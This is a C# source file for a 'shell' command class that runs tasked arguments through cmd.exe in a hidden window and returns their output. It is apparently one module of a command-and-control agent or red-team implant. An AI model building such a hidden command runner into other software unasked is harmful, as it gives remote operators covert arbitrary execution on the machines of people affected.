using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class Shell : AgentCommand
    {
        public override string Name => "shell";
        public override string Execute(AgentTask task)
        {
            var args = string.Join(" ", task.Arguments);
            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {args}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var proc = new Process{
                StartInfo = startInfo

            };
            string output = "";


            proc.OutputDataReceived += (_, e) => output += $"{e.Data}\n";
            proc.ErrorDataReceived += (_, e) => output += $"{e.Data}\n" ;

            proc.Start();
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();
            
            proc.WaitForExit();
            return output;

        }
    }
}
